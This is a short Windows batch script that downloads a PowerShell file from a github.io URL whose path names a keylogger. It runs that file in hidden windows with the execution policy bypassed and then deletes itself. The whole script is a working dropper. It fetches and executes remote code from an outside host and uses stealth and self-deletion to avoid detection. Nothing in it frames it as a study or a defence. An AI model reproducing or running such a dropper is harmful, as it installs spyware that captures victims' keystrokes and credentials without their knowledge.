@echo off

REM Define variables
set "SCRIPT_URL=https://mynewaccount-website.github.io/keylogger/installer.ps1"
set "SCRIPT_PATH=%TEMP%\installer.ps1"

REM Download the PowerShell script
powershell -NoProfile -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -OutFile '%SCRIPT_PATH%'"

REM Waiting for download
timeout /T 5 /NOBREAK > nul

REM Run the downloaded script silently
powershell -NoProfile -WindowStyle Hidden -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File \"\"%SCRIPT_PATH%\"\"' -WindowStyle Hidden"

REM Waiting to finish all the processes
timeout /T 5 /NOBREAK > nul

REM Auto-delete / cleanup
set "THIS_SCRIPT_PATH=%~nx0"
del /F %THIS_SCRIPT_PATH%

exit